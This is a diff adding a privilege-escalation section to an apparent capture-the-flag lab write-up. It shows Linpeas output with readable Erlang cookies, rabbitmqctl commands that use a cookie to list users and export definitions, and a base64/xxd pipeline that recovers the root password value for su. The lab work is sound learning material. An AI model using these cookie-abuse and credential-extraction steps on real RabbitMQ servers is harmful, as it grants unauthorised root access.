@@ -143,9 +143,9 @@ cat /home/azrael/user.txt
 
 ## Privilege Escalation
 
-After enumerating the machine with Linpeas, we didn't find anything.
+### PrivEsc with RabbitMQ service&#x20;
 
-The server has another hosted:
+After enumerating the machine with Linpeas, we saw the there is rabbitmq services running on port 4369:
 
 ```bash
 4369/tcp  open  epmd    Erlang Port Mapper Daemon
@@ -155,6 +155,98 @@ The server has another hosted:
 |_    rabbit: 25672
 ```
 
-Enumerate users
+RabbitMQ service is a dependable messaging and streaming service.
 
-{% embed url="https://www.rabbitmq.com/docs/access-control#overview" %}
+To authenticate to a rabbitmq node we need the Earlang Cookie.&#x20;
+
+{% code title="Linpeas output" %}
+```bash
+╔══════════╣ Analyzing Erlang Files (limit 70)
+-r-------- 1 azrael azrael 20 Jul 23 00:00 /home/azrael/.erlang.cookie                                              
+CJFEPAZSYRYJDGEEHKSE
+-r-----r-- 1 rabbitmq rabbitmq 16 Jul 23 19:06 /var/lib/rabbitmq/.erlang.cookie
+yQKqGS5hcuvz0jIi
+
+```
+{% endcode %}
+
+With this cookie we have the rights to access and management the rabbit node.
+
+Viewing the DNS config we can find out now domain to add in out /etc/hosts file.&#x20;
+
+```
+127.0.0.1 localhost
+127.0.1.1 forge <--
+127.0.0.1 cloudsite.thm
+127.0.0.1 storage.cloudsite.thm
+```
+
+Now we can connect to Erlang node with cookies obtained from our attacker machine and try to list all user.
+
+{% code overflow="wrap" %}
+```bash
+sudo rabbitmqctl --node rabbit@forge --erlang-cookie "yQKqGS5hcuvz0jIi" list_users
+
+user    tags
+The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256.     []
+root    [administrator]
+
+```
+{% endcode %}
+
+Now try to extract the configuration file with this command:
+
+{% code overflow="wrap" %}
+```bash
+sudo rabbitmqctl --erlang-cookie 'yQKqGS5hcuvz0jIi' --node rabbit@forge export_definitions /tmp/conf.json
+```
+{% endcode %}
+
+```bash
+cat /tmp/conf.json | jq
+
+[..snip..]
+{
+      "hashing_algorithm": "rabbit_password_hashing_sha256",
+      "limits": {},
+      "name": "root",
+      "password_hash": "49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF",
+      "tags": [
+        "administrator"
+      ]
+    }
+[..snip..]
+```
+
+Reading the following part of the documentation we can decrypt the passowrd\_hash.
+
+{% embed url="https://www.rabbitmq.com/docs/passwords#this-is-the-algorithm" %}
+
+&#x20;With this command we can revert the hash:
+
+{% code overflow="wrap" %}
+```bash
+echo "49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF" | base64 -d | xxd -p -c 100 | cut -c9-
+
+295d1d1...811ed194f98073585
+
+# xxd: is a HEX dumper
+# -p: plain hexdump (extract hex chars from binary)
+# -c 100: extend the output chars per line 
+
+# cut -c9-: This trims the first 8 characters from each line of the hex output
+```
+{% endcode %}
+
+Now with the password, we can make access as `root` user.
+
+```bash
+su root
+Password: 295d1d1...811ed194f98073585
+```
+
+Let's print the root flag.
+
+```bash
+cat /root/root.txt
+```
